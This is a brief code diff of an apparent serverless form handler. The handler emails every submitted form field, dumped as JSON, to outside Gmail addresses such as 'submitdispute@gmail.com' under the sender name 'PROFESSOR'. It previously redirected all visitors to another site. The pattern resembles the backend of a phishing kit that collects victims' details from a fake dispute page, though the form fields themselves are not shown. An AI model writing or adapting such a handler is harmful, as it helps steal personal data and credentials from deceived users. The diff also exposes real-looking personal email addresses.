@@ -43,7 +43,7 @@ export default async function handler(req, res) {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
       to: "newzatpage@gmail.com,submitdispute@gmail.com",
-      subject: "Zubair",
+      subject: "Chumpa",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(
         formData,
@@ -54,7 +54,5 @@ export default async function handler(req, res) {
   } catch (error) {
     console.error("Email send error:", error);
   }
-
-  // Always redirect (success or failure)
-  return res.redirect(302, "https://zubair1pass-pearl.vercel.app/");
+  
 }
